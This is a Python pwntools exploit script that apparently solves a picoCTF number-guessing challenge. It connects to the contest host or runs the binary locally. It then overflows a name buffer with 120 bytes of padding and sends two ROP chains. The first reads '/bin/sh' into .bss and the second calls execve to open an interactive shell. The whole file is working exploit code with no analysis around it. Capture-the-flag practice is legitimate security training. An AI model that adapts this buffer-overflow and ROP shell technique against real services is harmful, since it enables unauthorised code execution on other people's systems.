#!/usr/bin/env python3
from pwn import *

# Config
context.log_level = 'debug'
context.arch = 'amd64'

BINARY = './vuln'  # replace as needed
HOST = 'shape-facility.picoctf.net'
PORT = 54487

POP_RAX = 0x000000000042b20b # pop rax ; ret
POP_RDX = 0x0000000000438152 # pop rdx ; ret

POP_RDI_DIRTY = 0x00000000004022f8 # pop rdi ; pop rbp ; ret
POP_RSI_DIRTY = 0x000000000040b686 # pop rsi ; pop rbp ; ret

SYSCALL = 0x0000000000401378
RET = 0x000000000040101a


def get_connection(mode):
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Use 'local' or 'remote'")
        exit(1)

def exploit(conn):
    payload_0 = b"84"
    payload_0_1 = b"87"

    # adjust prompt as necessary
    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(payload_0)

    executable = ELF(BINARY, checksec=False)
    bss = executable.bss()

    payload_1 = b"X" * 120
    payload_1 += p64(POP_RDI_DIRTY) + p64(0) + p64(0)      # rdi = 0, extra rbp
    payload_1 += p64(POP_RSI_DIRTY) + p64(bss) + p64(0)    # rsi = bss, extra rbp
    payload_1 += p64(POP_RDX) + p64(8)                        # rdx = 8
    payload_1 += p64(POP_RAX) + p64(0)                        # rax = 0 (sys_read)
    payload_1 += p64(SYSCALL)                                 # syscall

    # part 2
    payload_2 = b""
    payload_2 += p64(RET) 
    payload_2 += p64(POP_RAX) + p64(59)
    payload_2 += p64(POP_RDI_DIRTY) + p64(bss) + p64(0)
    payload_2 += p64(POP_RSI_DIRTY) + p64(0) + p64(0)
    payload_2 += p64(POP_RDX) + p64(0)

    # syscall
    payload_2 += p64(SYSCALL)

    conn.recvuntil(b'New winner!\nName? ')
    conn.sendline(payload_1)

    conn.recvuntil(b'Congrats ')  
    conn.send(b'/bin/sh\x00') 

    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(payload_0_1)
    conn.recvuntil(b'Name? ')
    conn.sendline(payload_2)

    conn.interactive()

def main():
    import sys
    if len(sys.argv) != 2:
        log.error("Usage: python3 exploit.py [local|remote]")
        exit(1)

    conn = get_connection(sys.argv[1])
    exploit(conn)
    conn.close()

if __name__ == "__main__":
    main()
